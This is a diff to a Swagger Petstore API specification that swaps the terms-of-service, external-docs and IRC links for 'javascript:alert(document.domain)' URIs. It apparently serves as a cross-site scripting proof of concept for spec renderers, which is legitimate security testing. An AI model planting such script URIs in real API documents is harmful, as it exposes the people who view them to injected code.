@@ -1,10 +1,10 @@
 {
 "swagger": "2.0",
 "info": {
-"description": "This is a sample server Petstore server.  You can find out more about Swagger at [javascript:alert(document.domain)](javascript:alert(document.domain)) or on [irc.freenode.net, #swagger](http://swagger.io/irc/).  For this sample, you can use the api key `special-key` to test the authorization filters.",
+"description": "This is a sample server Petstore server.  You can find out more about Swagger at [javascript:alert(document.domain)](javascript:alert(document.domain)) or on [irc.freenode.net, #swagger](javascript:alert(document.domain)).  For this sample, you can use the api key `special-key` to test the authorization filters.",
 "version": "1.0.6",
 "title": "Swagger Petstore",
-"termsOfService": "http://swagger.io/terms/",
+"termsOfService": "javascript:alert(document.domain)",
 "contact": {
 "email": "apiteam@swagger.io"
 },
@@ -1049,6 +1049,6 @@
 },
 "externalDocs": {
 "description": "Find out more about Swagger",
-"url": "http://swagger.io"
+"url": "javascript:alert(document.domain)"
 }
 }
